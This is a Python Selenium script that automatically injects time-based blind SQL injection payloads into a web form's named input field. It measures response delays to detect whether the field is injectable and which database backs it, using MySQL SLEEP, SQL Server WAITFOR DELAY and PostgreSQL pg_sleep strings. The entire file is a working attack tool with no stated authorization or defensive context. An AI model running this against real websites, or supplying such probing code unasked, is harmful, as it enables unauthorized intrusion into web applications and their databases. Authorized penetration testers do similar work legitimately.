import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import UnexpectedAlertPresentException, TimeoutException, NoAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager


EXPECTED_DELAY = 5
TOLERANCE = 2
PAYLOADS = {
    "MySQL": f"' AND IF(1=1, SLEEP({EXPECTED_DELAY}), 0) -- ",
    "SQL Server": f"' WAITFOR DELAY '0:0:{EXPECTED_DELAY}' -- ",
    "PostgreSQL": f"' AND pg_sleep({EXPECTED_DELAY}) -- ",
}

class Input_obj:
    def __init__(self, input_line, url, usable=False):
        self.input_line = input_line
        self.url = url
        
        self.name = None
        self.input_type = None
        
        self.db_type = None
        self.usable = usable
        
        self.input_data(input_line)
        
        
        # self.identify_db_time_based()
    
    def identify_db(self):
        options = webdriver.ChromeOptions()
        # options.add_argument("--headless")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)

        driver.set_page_load_timeout(EXPECTED_DELAY + TOLERANCE + 10)

        try:
            print(f"Navigation vers : {self.url}")
            driver.get(self.url)
            
            wait = WebDriverWait(driver, 10)
            
            try:
                input_field_initial = wait.until(EC.presence_of_element_located((By.NAME, self.name)))
            except TimeoutException:
                print(f"Timeout: Input field with name '{self.name}' not found on {self.url}")
                driver.quit()
                return

            for db_type, payload in PAYLOADS.items():
                print(f"\n--- Test avec payload pour {db_type} ---")
                print(f"Payload utilisé : '{payload.strip()}'")   
                
                driver.get(self.url)
                
                try:
                    alert = driver.switch_to.alert
                    print(f"Dismissing initial alert: {alert.text}")
                    alert.accept()
                except NoAlertPresentException:
                    pass 

                try:
                    input_field = wait.until(EC.presence_of_element_located((By.NAME, self.name)))
                    
                    start_time = time.time()
                    
                    input_field.send_keys(payload)
                    input_field.send_keys(Keys.RETURN)
                    
                    try:
                        WebDriverWait(driver, 2).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        print(f"Alert Text (after payload): {alert.text}")
                        if "You must enter a valid password" in alert.text:
                            pass_field = wait.until(EC.presence_of_element_located((By.NAME, "passw")))
                            pass_field.send_keys("pass")
                            input_field.send_keys(payload)
                            
                        alert.accept()
                        
                        response_time = time.time() - start_time 
                        print(f"Alert dismissed. Response time adjusted: {response_time:.2f} seconds.")
                        print(f"--> Application displayed an alert, likely not vulnerable to this specific payload for {db_type}.")
                        continue 
                    except TimeoutException:
                        pass 
                    
                    end_time = time.time()
                    response_time = end_time - start_time
                    print(f"Temps de réponse observé : {response_time:.2f} secondes")

                    if response_time >= (EXPECTED_DELAY + TOLERANCE):
                        print(f"--> Potentielle injection SQL basique réussie pour {db_type} ! Le temps de réponse est significativement plus long.")
                        self.db_type = db_type
                         
                    elif response_time >= EXPECTED_DELAY:
                        print(f"--> Le temps de réponse est proche du délai attendu pour {db_type}. Vérifiez les conditions réseau/serveur.")
                    else:
                        print(f"--> Temps de réponse normal. L'application ne semble pas vulnérable à ce payload pour {db_type} ou le payload n'a pas été exécuté.")
                    
                except UnexpectedAlertPresentException as e:
                    print(f"Caught an unexpected alert during payload execution for {db_type}. Error: {e}")
                    try:
                        alert = driver.switch_to.alert
                        print(f"Dismissing the unexpected alert: {alert.text}")
                        alert.accept()
                    except NoAlertPresentException:
                        pass 
                    print(f"--> The test for {db_type} was interrupted by an alert. Re-run or investigate manually.")
                    
                except Exception as e:
                    print(f"Une erreur s'est produite lors de l'envoi du payload ou du chargement de la page : {e}")
                    if "timeout" in str(e).lower():
                        print(f"--> Le chargement de la page a expiré, ce qui pourrait indiquer que le délai du payload pour {db_type} a été respecté.")
                        self.db_type = db_type 

        except Exception as e:
            print(f"Erreur générale : {e}")
        finally:
            driver.quit()

    def input_data(self, input_line):
        from bs4 import BeautifulSoup 
        soup = BeautifulSoup(input_line, 'html.parser')
        input_tag = soup.find('input')
        if input_tag:
            self.name = input_tag.get('name')
            self.type = input_tag.get('type')
            
    def __str__(self):
        COLOR_RESET = "\033[0m"
        COLOR_TYPE = "\033[34m"      # Blue
        COLOR_NAME = "\033[36m"      # Cyan
        COLOR_DB = "\033[33m"        # Yellow
        COLOR_GREEN = "\033[38;5;46m"
        COLOR_RED = "\033[38;5;160m"

        type_str = f"{COLOR_TYPE}{self.input_type or self.type or 'UnknownType'}{COLOR_RESET}"
        name_str = f"{COLOR_NAME}{self.name or 'UnknownName'}{COLOR_RESET}"
        db_str = f"{COLOR_DB}{self.db_type or 'UnknownDB'}{COLOR_RESET}"

        if self.usable:
            usable_str = f"{COLOR_GREEN}●{COLOR_RESET}"
        else:
            usable_str = f"{COLOR_RED}●{COLOR_RESET}"

        return f"{usable_str} {type_str:<20}{name_str:<25}{db_str:<20}"
